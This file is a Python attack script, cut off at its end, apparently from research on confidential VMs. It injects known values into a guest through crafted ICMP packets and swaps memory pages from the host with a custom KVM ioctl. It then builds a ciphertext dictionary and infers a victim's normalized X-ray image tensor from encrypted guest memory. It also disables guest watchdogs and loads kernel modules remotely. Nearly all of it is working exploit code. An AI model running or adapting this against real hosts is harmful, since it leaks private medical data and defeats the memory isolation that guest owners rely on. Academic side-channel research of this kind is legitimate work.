#!/usr/bin/env python3
"""
mura_dict_build.py — 64-ref XOR slice dictionary for MURA body-part attacker.

Phase 0  --build  (run once):
  Acquire FIXED_GPA via zero ICMP.
  For each of 64 REF_U8_64 values:
    payload = float32(X/255).view(uint8) × 4, repeated to ≥4097 B
    Send ICMP → GPA_refX
    do_swap_read(FIXED_GPA, GPA_refX) → dict_pages_mura/ref_{X:03d}.out
  Saves dict_cache_mura.json: {fixed_gpa, refs: {u8_val: {ref_gpa, file}}}

Phase 1  --infer  --image-gpa 0x...  (per inference):
  224×224 float32 = 200704 bytes = 49 pages (page-aligned).
  For k in 0..48:
    do_swap_read(FIXED_GPA, image_gpa + k*4096) → img_tmp/img_{k:02d}.out
  Compare all 49 dumps vs 64 ref dumps →
    xor_slice[ref_idx, row, col] = 1 iff img_chunk == ref_chunk at same block
  Shape: (64, 224, 56)  →  saved as --out (default: xor_slice.npy)

Usage:
  sudo python3 mura_dict_build.py --build
  sudo python3 mura_dict_build.py --infer --image-gpa 0x7f1234000
  sudo python3 mura_dict_build.py --infer --image-gpa 0x7f1234000 --out my_slice.npy
"""

import argparse
import ctypes
import fcntl
import json
import os
import re
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

import numpy as np

# ── 64 reference u8 values — must match mura_bodypart_attacker.ipynb ─────────
# Order = top-64 by empirical XOR-match density on the real MURA training set
# (same xor_density_survey.npy the notebook's cell 8/9 computes REF_U8_64 from).
# The channel axis of xor_slice is positional (channel i == "matches ref u8
# REF_U8_64[i]"), so this order must match exactly whatever consumes the
# slice -- previously this was a hardcoded 16-value list + sequential 0..255
# fill, which did NOT match the notebook's density order at all (verified:
# neither the order nor the underlying 64-value set agreed).
_DENSITY_SURVEY = Path(__file__).parent / "xor_density_survey.npy"
if not _DENSITY_SURVEY.exists():
    raise FileNotFoundError(
        f"{_DENSITY_SURVEY} not found -- copy it from the density survey run "
        f"(see mura_bodypart_attacker.ipynb cell 8) before REF_U8_64 can be built."
    )
_hit = np.load(_DENSITY_SURVEY)
REF_U8_64: list[int] = np.argsort(-_hit)[:64].tolist()
assert len(REF_U8_64) == 64

# REF_CHUNK_X used to be plain float32(X/255) -- WRONG. The real victim
# tensor (DenseNet-MURA-PyTorch's pipeline.py, get_dataloaders()) applies
# InterceptNormalize([0.485,0.456,0.406],[0.229,0.224,0.225]) -- ImageNet
# per-channel mean/std -- AFTER ToTensor()'s /255. So real memory holds
# (u8/255 - mean[c]) / std[c], not u8/255. Comparing against un-normalized
# u8/255 chunks meant literally every match against live victim memory was
# comparing the wrong bytes -- found 2026-08-25 after live match rate came
# back 1.46% vs an expected ~25.33% baseline (see xor_density_survey.npy
# analysis); this was likely the dominant cause, not just stale memory.
#
# infer() only ever reads 49 pages (one 224x224 plane) starting at a given
# image_gpa, i.e. it reads exactly ONE channel of the real (3,224,224)
# tensor -- by construction that's channel 0 (R) if image_gpa is the
# tensor's true base address. So this dictionary is built for the R
# channel's normalize params only. If infer() is ever extended to read all
# 147 pages (R+G+B), it needs separate G/B dictionaries built the same way
# with mean=0.456/std=0.224 (G) and mean=0.406/std=0.225 (B) -- not done
# here, out of scope for the current single-channel infer() usage.
#
# The u8 index (REF_U8_64) still means the same thing as before (the
# notebook's xor_slice channel semantics are u8-indexed, not tied to how
# the byte pattern was derived) -- only the actual injected/matched byte
# pattern changes.
_IMAGENET_MEAN_R = 0.485
_IMAGENET_STD_R  = 0.229


def normalize_u8_R(u8: int) -> np.float32:
    """Exact float32 value a raw R-channel pixel level u8 (0-255) becomes
    after ToTensor() (/255) + InterceptNormalize's R-channel mean/std."""
    return (np.float32(u8) / np.float32(255) - np.float32(_IMAGENET_MEAN_R)) / np.float32(_IMAGENET_STD_R)


# REF_CHUNK_X: float32 normalized value as 4 bytes, repeated 4× → 16 bytes
REF_CHUNKS: dict[int, bytes] = {
    u8: (np.array([normalize_u8_R(u8)], dtype=np.float32)).view(np.uint8).tobytes() * 4
    for u8 in REF_U8_64
}

# ── constants ─────────────────────────────────────────────────────────────────
PAGE_SIZE    = 4096
CHUNK_SIZE   = 16
CHUNKS_PAGE  = PAGE_SIZE // CHUNK_SIZE   # 256
IMG_PAGES    = 49    # 224×224 float32 = 200704 bytes = 49×4096 (page-aligned)
XOR_ROWS     = 224
XOR_COLS     = 56    # 224 // 4 pixels per chunk
PAYLOAD_SIZE = 8193  # fixed for ALL sends (probes + aligned)
                     # guarantees page[1] is always fully covered by payload
DRAIN_EVERY  = 16    # drain guest ICMP RX buffer every N acquisitions

# PSP command-rate pacing for do_swap_read() loops (infer(), scan_block()-style
# multi-page scans). Same constants/rationale as orchestrate_v4.py: PSP
# platform-resets under sustained ~60 snp_guest_page_move commands/sec; each
# --swap-back = 6 snp_guest_page_move = ~12 PSP commands. Without this, a tight
# per-page do_swap_read() loop (infer()'s 49 pages, or a 512-page block scan)
# fires ~12 PSP commands per iteration with zero spacing -- exactly the pattern
# that rebooted the host twice this session (2026-08-25, see memory:
# scan-block-reboots-server.md). 0.25s -> max ~48 cmds/s, safe margin under 60.
SWAP_PACE_SEC        = 0.25
SWAP_BURST_COOLDOWN  = 10   # after this many swaps, insert extra cooldown
SWAP_BURST_SLEEP     = 2.0

HERE       = Path(__file__).parent
DICT_DIR   = HERE / "dict_pages_mura"
DICT_CACHE = HERE / "dict_cache_mura.json"
IMG_TMP    = HERE / "img_tmp_mura"
SWAP_TOOL  = HERE / "swap_pages_tool"

# Candidate paths for the LARGE_ICMP module on the guest VM, checked in
# order -- ported from orchestrate_v4.py's _GUEST_ICMP_KO_CANDIDATES /
# _reload_icmp_monitor(), which handles guest-side module loss (e.g. after
# a host reboot restarts the guest VM fresh, losing a manually-inserted
# module) far more robustly than a single hardcoded path ever could. Found
# 2026-08-25: mid-build, guest hit a kernel WARNING in a writeback kworker,
# guest_large_icmp_monitor got unloaded, and the single-path lookup this
# used to have failed outright with no recovery.
_GUEST_ICMP_KO_CANDIDATES = [
    "~/sev-h100-sidechannel/2026attack/flow/guest_tool/guest_large_icmp_monitor.ko",
    "~/guest_large_icmp_monitor.ko",
    "/home/ubuntu/guest_large_icmp_monitor.ko",
    "/home/ubuntu/proof_code/guest_large_icmp_monitor.ko",
]
# Host-side backup .ko, scp'd to the guest as a last resort if none of the
# candidates above exist there anymore (same fallback orchestrate_v4.py uses).
_HOST_ICMP_KO_BACKUP = Path(__file__).resolve().parent.parent / "guest_large_icmp_monitor.ko"

# ICMP send pacing -- guest_large_icmp_monitor holds each packet in
# icmp_rcv softirq via mdelay(6000ms); sending again before that finishes
# queues skbs until the guest drops them and frag logging dies. Same
# constant/rationale as orchestrate_v4.py's _ICMP_HOLD_SEC.
_ICMP_HOLD_SEC = 7.0
_last_icmp_mono: float = 0.0

# ── SSH ───────────────────────────────────────────────────────────────────────
DEST_IP    = "192.168.100.2"
GUEST_SSH  = "ubuntu@localhost"
GUEST_PORT = "7777"
_sudo_user = os.environ.get("SUDO_USER")
_ssh_key   = (Path(f"/home/{_sudo_user}/.ssh/id_ed25519")
              if _sudo_user else Path.home() / ".ssh/id_ed25519")
SSH_BASE   = [
    "ssh", "-p", GUEST_PORT,
    "-i", str(_ssh_key),
    "-o", "StrictHostKeyChecking=no",
    "-o", "BatchMode=yes",
    "-o", "ConnectTimeout=30",
    GUEST_SSH,
]


def ssh(cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(SSH_BASE + [cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return ""


# ── guest liveness / ICMP pacing -- ported from orchestrate_v4.py ───────────
def _wait_icmp_hold(reason: str = "") -> None:
    """Block until the previous monitor-held ICMP softirq should be done."""
    global _last_icmp_mono
    if _last_icmp_mono <= 0:
        return
    wait = _ICMP_HOLD_SEC - (time.monotonic() - _last_icmp_mono)
    if wait <= 0:
        return
    why = f" ({reason})" if reason else ""
    print(f"  [pace] waiting {wait:.1f}s for guest mdelay hold{why}")
    time.sleep(wait)


def _note_icmp_sent() -> None:
    global _last_icmp_mono
    _last_icmp_mono = time.monotonic()


def _guest_alive(timeout: int = 8) -> bool:
    try:
        r = subprocess.run(SSH_BASE + ["echo ok"],
                           capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0 and "ok" in (r.stdout or "")
    except Exception:
        return False


def _wait_guest_alive(max_wait: int = 300) -> bool:
    """Poll SSH until the guest responds or max_wait elapses."""
    print(f"  [guest] waiting for recovery (up to {max_wait}s)...")
    deadline = time.time() + max_wait
    while time.time() < deadline:
        if _guest_alive():
            print("  [guest] reachable -- sleeping 10s for settle")
            time.sleep(10)
            return True
        time.sleep(15)
    print(f"  [guest] did not recover within {max_wait}s", file=sys.stderr)
    return False


def _clear_icmp_frag_log() -> None:
    """Reset guest frag snapshot. The current guest_large_icmp_monitor.ko writes
    the frag[N] info to /proc/large_icmp_last (via last_append), NOT to dmesg —
    so the old `dmesg -C`-only reset never cleared the real source. Clear both."""
    ssh("echo clear | sudo tee /proc/large_icmp_last >/dev/null 2>&1; "
        "sudo dmesg -C 2>/dev/null; true")


def _read_icmp_frag_log() -> str:
    """Return the guest ICMP snapshot text (frag[N]: compound_GPA=... off=... size=...).
    Current module writes it to /proc/large_icmp_last; dmesg is only a fallback
    for older kprobe-based modules."""
    proc = ssh("cat /proc/large_icmp_last 2>/dev/null")
    if proc and "frag[" in proc:
        return proc
    dmesg = ssh("sudo dmesg")
    if dmesg and "frag[" in dmesg:
        return dmesg
    return proc or dmesg or ""


# ── KVM swap-back + kernel page dump ─────────────────────────────────────────
_KVMIO = 0xAE
KVM_READ_PAGE_DUMP = (0x80000000 | ((PAGE_SIZE & 0x3FFF) << 16) | (_KVMIO << 8) | 0x2b)


def _bytes_to_xp(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, PAGE_SIZE, 16):
        lo = int.from_bytes(raw[i:i+8],    "little")
        hi = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{gpa+i:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


def do_swap_read(dict_gpa: int, src_gpa: int, out_path: Path,
                 swap_tool: str = str(SWAP_TOOL),
                 kvm_dev: str = "/dev/kvm") -> None:
    """
    swap-back read: src_gpa content → dict_gpa tweak → kernel buffer → out_path.
    Uses --swap-back so the guest never sees the inconsistent RMP state.
    """
    rc = subprocess.run(
        [swap_tool, f"0x{dict_gpa:x}", f"0x{src_gpa:x}", "--swap-back"],
    ).returncode
    if rc != 0:
        print(f"[!] swap_pages_tool failed (exit {rc})", file=sys.stderr)
        sys.exit(1)

    kvm_fd = os.open(kvm_dev, os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(PAGE_SIZE)
        fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
        raw = bytes(buf)
    finally:
        os.close(kvm_fd)

    out_path.write_text(_bytes_to_xp(dict_gpa, raw) + "\n")


# ── dump parsing ──────────────────────────────────────────────────────────────
_HEX = re.compile(r'[0-9a-f]{12,16}:\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)', re.IGNORECASE)


def parse_dump(path: Path) -> bytes:
    chunks = []
    for line in path.read_text(errors="replace").splitlines():
        m = _HEX.search(line)
        if m:
            chunks.append(struct.pack("<QQ", int(m.group(1), 16), int(m.group(2), 16)))
    if not chunks:
        raise ValueError(f"No data lines in {path}")
    return b"".join(chunks)


# ── ICMP helpers ──────────────────────────────────────────────────────────────
def _checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i+1] << 8) + data[i]
    if len(data) & 1:
        s += data[-1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _parse_frag_p1(dmesg_out: str) -> int | None:
    """
    Parse 'frag[0] ... off=N' → bytes remaining in sub-page[0] from ICMP payload start.
    Formula: 4096 - (frag_off % 4096) - 8  (8 = ICMP echo header)
    """
    m = re.search(r"frag\[0\].*?\boff=(\d+)", dmesg_out)
    if not m:
        return None
    frag_off = int(m.group(1))
    return PAGE_SIZE - (frag_off % PAGE_SIZE) - 8


def _parse_sub_page1_gpa(dmesg_out: str) -> int | None:
    """
    Compute sub-page[1] GPA from frag[0] compound_GPA + off.
    Avoids relying on 'sub-page[N] GPA=' lines which use printk_ratelimited()
    and get silently dropped after ~10 messages/5s regardless of printk_ratelimit sysctl.

    sub-page[0] = compound_GPA + (off // 4096) * 4096
    sub-page[1] = sub-page[0] + 4096   ← always fully covered by our 8193-byte payload
    """
    m = re.search(
        r"frag\[0\].*?compound_GPA=0x([0-9a-f]+).*?\boff=(\d+)",
        dmesg_out, re.IGNORECASE,
    )
    if not m:
        return None
    compound_gpa = int(m.group(1), 16)
    frag_off     = int(m.group(2))
    start_page   = frag_off // PAGE_SIZE
    return compound_gpa + (start_page + 1) * PAGE_SIZE


def _make_payload(u8_val: int | None, prefix: int = 0,
                   chunk_bytes: bytes | None = None) -> bytes:
    """
    Build PAYLOAD_SIZE-byte payload: prefix zero bytes + content.
    u8_val=None and chunk_bytes=None → zeros.
    chunk_bytes given → that 16-byte chunk repeated (workload-agnostic path,
        used by e.g. mnist_dict_build.py which has its own reference values;
        u8_val is still passed through for logging/dict-key purposes only).
    Otherwise → REF_CHUNKS[u8_val] repeated (original MURA behavior,
        unchanged for existing callers).
    """
    content_size = PAYLOAD_SIZE - prefix
    if u8_val is None and chunk_bytes is None:
        content = b"\x00" * content_size
    else:
        chunk = chunk_bytes if chunk_bytes is not None else REF_CHUNKS[u8_val]
        n     = content_size // CHUNK_SIZE + 1
        content = (chunk * n)[:content_size]
    return b"\x00" * prefix + content


def _send_icmp_payload(payload: bytes) -> None:
    # Pace against the guest's own mdelay(6000) hold from the PREVIOUS send --
    # sending again before that finishes queues skbs until the guest drops
    # them and frag logging dies (see _ICMP_HOLD_SEC comment). Wrapping the
    # single send primitive means every caller gets this for free.
    _wait_icmp_hold()
    pid = os.getpid() & 0xFFFF
    hdr = struct.pack("!BBHHH", 8, 0, 0, pid, 0)
    chk = _checksum(hdr + payload)
    hdr = struct.pack("!BBHHH", 8, 0, chk, pid, 0)
    sock_ = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    try:
        sock_.sendto(hdr + payload, (DEST_IP, 0))
    finally:
        sock_.close()
    _note_icmp_sent()


def acquire_gpa(u8_val: int | None, retries: int = 5,
                chunk_bytes: bytes | None = None) -> int:
    """
    2 probe sends (zeros) + 1 aligned send → return page[1] GPA.

    u8_val=None : zero payload  → FIXED_GPA acquisition
    u8_val=int  : REF_CHUNK_X   → ref dict page acquisition

    Alignment:
      probe1, probe2 each measure frag_p1 = PAGE_SIZE − (payload_offset in page[0]).
      expected_frag = predicted frag_p1 for the next send.
      prefix = expected_frag  →  prefix zeros fill the rest of page[0] exactly.
      → page[1] byte 0 = first byte of content (zeros or REF_CHUNK_X).
      gpas[1] = page[1] GPA = always full 4096-byte content page.
    """
    probe = b"\x00" * PAYLOAD_SIZE

    def _probe_once() -> tuple[int | None, str]:
        """Send one zero probe, return (frag_p1, snapshot_text)."""
        _clear_icmp_frag_log()
        _send_icmp_payload(probe)
        out = ""
        fp1 = None
        for _t in range(4):
            time.sleep(1.0 if _t == 0 else 2.0)
            out = _read_icmp_frag_log()
            fp1 = _parse_frag_p1(out)
            if fp1 is not None:
                break
        return fp1, out

    for attempt in range(retries):
        # ── probe 1 ──────────────────────────────────────────────────────────
        frag_p1_a, out1 = _probe_once()
        # ── probe 2 ──────────────────────────────────────────────────────────
        frag_p1_b, out2 = _probe_once()

        if frag_p1_a is None or frag_p1_b is None:
            print(f"  [!] frag_p1 parse failed a={frag_p1_a} b={frag_p1_b}"
                  f" (attempt {attempt+1}/{retries})", file=sys.stderr)
            for label, out in [("probe1", out1), ("probe2", out2)]:
                snippet = out.strip()[:400] if out.strip() else "(empty)"
                print(f"  [dmesg {label}]: {snippet}", file=sys.stderr)

            # If the hook is not firing at all (no "[LARGE_ICMP]" snapshot in
            # either probe), reload the module — lsmod alone won't catch a dead
            # netfilter hook. (Current module has no "handler fired" line; it
            # writes "[LARGE_ICMP] payload_len=..." to /proc when the hook runs.)
            if "[LARGE_ICMP]" not in out1 and "[LARGE_ICMP]" not in out2:
                print("  [!] ICMP hook not firing — reloading module", file=sys.stderr)
                reload_icmp_module()
                time.sleep(2)
            else:
                time.sleep(10 * (attempt + 1))
            continue

        delta         = (frag_p1_a - frag_p1_b) % PAGE_SIZE
        expected_frag = (frag_p1_b  - delta)    % PAGE_SIZE
        print(f"  probe frag_p1: {frag_p1_a},{frag_p1_b}"
              f"  δ={delta}  prefix={expected_frag}")

        # ── aligned send ─────────────────────────────────────────────────────
        payload = _make_payload(u8_val, prefix=expected_frag, chunk_bytes=chunk_bytes)
        _clear_icmp_frag_log()
        _send_icmp_payload(payload)
        time.sleep(1)

        for _ in range(3):
            out = _read_icmp_frag_log()
            gpa = _parse_sub_page1_gpa(out)
            if gpa is not None:
                actual_frag_p1 = _parse_frag_p1(out)
                if actual_frag_p1 is not None:
                    actual_landing = (expected_frag - actual_frag_p1) % PAGE_SIZE
                    if actual_landing != 0:
                        print(f"  [!] landing={actual_landing} (expected 0)",
                              file=sys.stderr)
                return gpa
            time.sleep(2)

        print(f"  [!] No GPA (attempt {attempt+1}/{retries})", file=sys.stderr)
        time.sleep(10 * (attempt + 1))

    raise RuntimeError("acquire_gpa: failed after retries")


def drain_rxbuf(rounds: int = 1) -> int:
    """Flush pending ICMP on the guest. Returns packets drained (best-effort).
    rounds>1 (ported from orchestrate_v4.py's drain_guest_rxbuf) matters when
    recovering from a backlog -- one 0.3s pass often isn't enough to catch
    everything queued behind a stalled monitor."""
    out = ssh(
        "sudo python3 << 'EOF'\n"
        "import socket, select\n"
        f"rounds = {int(rounds)}\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n"
        "s.setblocking(False)\n"
        "n = 0\n"
        "for _ in range(rounds):\n"
        "    while select.select([s], [], [], 0.3)[0]:\n"
        "        try: s.recv(65536); n += 1\n"
        "        except OSError: break\n"
        "s.close()\nprint(f'drained {n}')\nEOF",
        timeout=30,
    )
    m = re.search(r"drained\s+(\d+)", out or "")
    n = int(m.group(1)) if m else 0
    print(f"  [drain] {(out or '').strip() or f'drained {n}'}")
    return n


def _find_guest_ko() -> str:
    """Return absolute path to guest_large_icmp_monitor.ko on the guest, or ''.
    Ported from orchestrate_v4.py's _reload_icmp_monitor(): checks a list of
    candidate paths in one shell round-trip, and if none exist anymore (e.g.
    a host reboot restarted the guest VM fresh, losing a manually-inserted
    module -- confirmed happening 2026-08-25), scp's a host-side backup .ko
    into the guest as a last resort instead of just failing."""
    find = ssh(
        "for p in " + " ".join(_GUEST_ICMP_KO_CANDIDATES) + "; do "
        "  eval ep=\"$p\"; "
        "  if [ -f \"$ep\" ]; then echo FOUND:$ep; break; fi; "
        "done",
        timeout=20,
    )
    m = re.search(r"FOUND:(\S+)", find or "")
    if m:
        return m.group(1)

    if not _HOST_ICMP_KO_BACKUP.is_file():
        print(f"  [reload] no candidate found on guest, and no host backup at "
              f"{_HOST_ICMP_KO_BACKUP}", file=sys.stderr)
        return ""

    print(f"  [recover] scp {_HOST_ICMP_KO_BACKUP} -> guest:~/guest_large_icmp_monitor.ko")
    try:
        subprocess.run(
            ["scp", "-P", GUEST_PORT, "-i", str(_ssh_key),
             "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
             str(_HOST_ICMP_KO_BACKUP), f"{GUEST_SSH}:~/guest_large_icmp_monitor.ko"],
            capture_output=True, text=True, timeout=60, check=False,
        )
    except Exception as e:
        print(f"  [recover] scp failed: {e}", file=sys.stderr)
        return ""
    find = ssh(
        "test -f ~/guest_large_icmp_monitor.ko && echo FOUND:$HOME/guest_large_icmp_monitor.ko",
        timeout=15,
    )
    m = re.search(r"FOUND:(\S+)", find or "")
    return m.group(1) if m else ""


def reload_icmp_module() -> None:
    """Reload guest LARGE_ICMP kernel module. Ported from orchestrate_v4.py's
    _reload_icmp_monitor(): rmmod (both possible module names) THEN wait out
    the mdelay hold THEN drain THEN insmod -- insmoding immediately after
    rmmod can re-arm mdelay on a whole backlog and the next probe still sees
    no frags. The old version here just rmmod+insmod'd back-to-back.

    Checks guest liveness FIRST (ported from orchestrate_v4.py's
    recover_guest_icmp(), which this function skipped porting the first
    time -- found 2026-08-25 when an unresponsive guest made every SSH-based
    step below (find_guest_ko's ssh calls, the scp fallback) hang for its
    full timeout before failing, instead of waiting for the guest to come
    back up."""
    if not _guest_alive():
        print("  [reload] guest SSH unreachable -- waiting for recovery "
              "before attempting reload", file=sys.stderr)
        if not _wait_guest_alive():
            raise RuntimeError("reload_icmp_module: guest did not recover")

    ko_path = _find_guest_ko()
    if not ko_path:
        print("  [reload] ERROR: guest_large_icmp_monitor.ko not found on guest "
              "(checked candidates + host backup)", file=sys.stderr)
        raise RuntimeError("reload_icmp_module: .ko not found")

    out_rm = ssh(
        "sudo rmmod guest_large_icmp_monitor 2>/dev/null; "
        "sudo rmmod guest_large_icmp 2>/dev/null; "
        "echo rmmod_done",
        timeout=60,
    )
    print(f"  [reload] {(out_rm or '').strip() or 'rmmod done'}; "
          f"draining backlog {_ICMP_HOLD_SEC:.0f}s without monitor...")
    time.sleep(_ICMP_HOLD_SEC)
    drain_rxbuf(rounds=3)

    out = ssh(
        f"sudo insmod '{ko_path}' && lsmod | grep -E 'guest_large_icmp|large_icmp'",
        timeout=30,
    )
    ok = "guest_large" in (out or "") or "large_icmp" in (out or "")
    if not ok:
        print(f"  [reload] ERROR: insmod {ko_path} failed: {(out or '').strip()}",
              file=sys.stderr)
        raise RuntimeError(f"reload_icmp_module: insmod failed for {ko_path}")
    print(f"  [reload] guest_large_icmp_monitor ({ko_path}): OK")
    global _last_icmp_mono
    _last_icmp_mono = 0.0  # clean slate; no in-flight monitor hold


# ── Phase 0: build ────────────────────────────────────────────────────────────
def build(swap_tool: str) -> None:
    DICT_DIR.mkdir(exist_ok=True)

    print(f"[build] {len(REF_U8_64)} ref values: {REF_U8_64}")

    print("[build] Reloading guest ICMP module to reset rate-limit state...")
    reload_icmp_module()

    cache: dict = {"fixed_gpa": None, "refs": {}}

    # Step 1: FIXED_GPA
    if cache["fixed_gpa"] is None:
        print("\n[build] Acquiring FIXED_GPA (zero payload)...")
        fixed_gpa = acquire_gpa(None)
        cache["fixed_gpa"] = hex(fixed_gpa)
        with open(DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)
        print(f"  FIXED_GPA = 0x{fixed_gpa:x}")
    else:
        fixed_gpa = int(cache["fixed_gpa"], 16)
        print(f"[build] FIXED_GPA = 0x{fixed_gpa:x}  (from cache)")

    # Step 2: one send+swap_read per ref value
    for i, u8_val in enumerate(REF_U8_64):
        print(f"\n[{i+1:2d}/{len(REF_U8_64)}] u8={u8_val:3d}  "
              f"chunk={REF_CHUNKS[u8_val].hex()}")

        if i > 0 and i % DRAIN_EVERY == 0:
            print("  [drain] flushing guest ICMP buffer + reloading module...")
            drain_rxbuf()
            reload_icmp_module()

        out_path = DICT_DIR / f"ref_{u8_val:03d}.out"

        gpa_refX = acquire_gpa(u8_val)
        print(f"  GPA_ref{u8_val:03d} = 0x{gpa_refX:x}")

        if gpa_refX == fixed_gpa:
            # Rare: kernel reused the same buffer page — retry once
            print(f"  [!] GPA_refX == FIXED_GPA, retry...")
            drain_rxbuf()
            gpa_refX = acquire_gpa(u8_val)
            if gpa_refX == fixed_gpa:
                print(f"  [!] Still same GPA — skipping u8={u8_val}", file=sys.stderr)
                continue

        print(f"  do_swap_read(0x{fixed_gpa:x}, 0x{gpa_refX:x}) → {out_path.name}")
        do_swap_read(fixed_gpa, gpa_refX, out_path, swap_tool)
        time.sleep(6)  # let printk_ratelimited 5s window expire before next item

        cache["refs"][str(u8_val)] = {
            "ref_gpa":   hex(gpa_refX),
            "fixed_gpa": hex(fixed_gpa),
            "file":      str(out_path),
        }
        with open(DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)

    n_done = len(cache["refs"])
    print(f"\n[build] Done. {n_done}/{len(REF_U8_64)} refs → {DICT_CACHE}")


# ── Phase 1: infer ────────────────────────────────────────────────────────────
def infer(image_gpa: int, swap_tool: str, out_path: Path) -> None:
    if not DICT_CACHE.exists():
        print(f"[!] {DICT_CACHE} not found — run --build first.", file=sys.stderr)
        sys.exit(1)

    with open(DICT_CACHE) as f:
        cache = json.load(f)

    fixed_gpa = int(cache["fixed_gpa"], 16)
    print(f"[infer] FIXED_GPA   = 0x{fixed_gpa:x}")
    print(f"[infer] image_gpa   = 0x{image_gpa:x}  ({IMG_PAGES} pages)")

    IMG_TMP.mkdir(exist_ok=True)

    # Dump 49 image pages at FIXED_GPA tweak
    img_dumps: list[bytes] = []
    for k in range(IMG_PAGES):
        page_gpa = image_gpa + k * PAGE_SIZE
        tmp      = IMG_TMP / f"img_{k:02d}.out"
        if k > 0:
            if SWAP_BURST_COOLDOWN > 0 and k % SWAP_BURST_COOLDOWN == 0:
                print(f"  [pace] burst cooldown after {k} swaps ({SWAP_BURST_SLEEP:.1f}s)")
                time.sleep(SWAP_BURST_SLEEP)
            elif SWAP_PACE_SEC > 0:
                time.sleep(SWAP_PACE_SEC)
        print(f"  page {k:2d}/48  do_swap_read(0x{fixed_gpa:x}, 0x{page_gpa:x}) → {tmp.name}")
        do_swap_read(fixed_gpa, page_gpa, tmp, swap_tool)
        img_dumps.append(parse_dump(tmp))

    # Load 64 ref dumps
    ref_dumps: dict[int, bytes] = {}
    missing = []
    for u8_val in REF_U8_64:
        entry = cache["refs"].get(str(u8_val))
        if entry is None:
            missing.append(u8_val)
            continue
        ref_dumps[u8_val] = parse_dump(Path(entry["file"]))
    if missing:
        print(f"[!] Missing ref dumps for u8 values: {missing}", file=sys.stderr)
        print("[!] Re-run --build to complete the dictionary.", file=sys.stderr)
        sys.exit(1)
    print(f"\n[infer] Loaded {len(ref_dumps)} ref dumps")

    # Build XOR slice (64, 224, 56)
    # xor_slice[ref_idx, row, col] = 1.0 iff image chunk == ref chunk at that block
    xor_slice = np.zeros((len(REF_U8_64), XOR_ROWS, XOR_COLS), dtype=np.float32)

    for ref_idx, u8_val in enumerate(REF_U8_64):
        ref_bytes = ref_dumps[u8_val]
        for k, img_bytes in enumerate(img_dumps):
            for j in range(CHUNKS_PAGE):          # 256 chunks per page
                s = j * CHUNK_SIZE
                if img_bytes[s:s+CHUNK_SIZE] == ref_bytes[s:s+CHUNK_SIZE]:
                    flat = k * CHUNKS_PAGE + j     # 0 .. 12543
                    xor_slice[ref_idx, flat // XOR_COLS, flat % XOR_COLS] = 1.0

    np.save(str(out_path), xor_slice)
    total_hits = int(xor_slice.sum())
    print(f"\n[infer] XOR slice shape : {xor_slice.shape}")
    print(f"[infer] Total hits      : {total_hits} / {xor_slice.size}  "
          f"({total_hits/xor_slice.size*100:.2f}%)")
    print(f"[infer] Saved → {out_path}")


# ── main ──────────────────────────────────────────────────────────────────────
def ensure_mtu_9000() -> None:
    """Set MTU 9000 on host TAP and guest ICMP interface to prevent IP fragmentation.
    Without jumbo frames, 8193-byte ICMP payloads fragment; reassembled skbs use
    frag_list (not skb_shinfo->frags), so guest_large_icmp_monitor misses the GPAs."""
    r = subprocess.run(["ip", "route", "get", DEST_IP],
                       capture_output=True, text=True)
    m = re.search(r'\bdev\s+(\S+)', r.stdout)
    if m:
        host_iface = m.group(1)
        cur = subprocess.run(["ip", "link", "show", host_iface],
                             capture_output=True, text=True).stdout
        if "mtu 9000" not in cur:
            subprocess.run(["ip", "link", "set", host_iface, "mtu", "9000"], check=True)
            print(f"[mtu] host {host_iface} → 9000")
        else:
            print(f"[mtu] host {host_iface} already 9000")
    else:
        print("[mtu] WARNING: could not determine host interface", file=sys.stderr)

    out = ssh("ip -o addr show | awk '/192\\.168\\.100\\.2/{print $2}'")
    guest_iface = out.strip() or "enp0s4"
    result = ssh(f"ip link show {guest_iface}")
    if "mtu 9000" not in result:
        ssh(f"sudo ip link set {guest_iface} mtu 9000")
        print(f"[mtu] guest {guest_iface} → 9000")
    else:
        print(f"[mtu] guest {guest_iface} already 9000")


def main() -> None:
    # Suppress guest watchdog / THP (same as orchestrate_v2.py)
    ssh(
        "echo 0 | sudo tee /proc/sys/kernel/watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/nmi_watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/softlockup_panic > /dev/null 2>&1 ; "
        "echo 1 | sudo tee /proc/sys/kernel/rcu_cpu_stall_suppress > /dev/null 2>&1 ; "
        "echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/printk_ratelimit > /dev/null 2>&1",
        timeout=30,
    )

    ensure_mtu_9000()

    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--build",     action="store_true",
                   help="Build 64-ref dictionary (run once, resumes if interrupted)")
    p.add_argument("--infer",     action="store_true",
                   help="Generate XOR slice for one image inference")
    p.add_argument("--image-gpa", type=lambda x: int(x, 0), default=None,
                   help="Image tensor base GPA (hex, page-aligned, 49 pages)")
    p.add_argument("--out",       default="xor_slice.npy",
                   help="Output .npy path (default: xor_slice.npy)")
    p.add_argument("--swap-tool", default=str(SWAP_TOOL),
                   help=f"Path to swap_pages_tool (default: {SWAP_TOOL})")
    args = p.parse_args()

    if args.build:
        build(args.swap_tool)
    elif args.infer:
        if args.image_gpa is None:
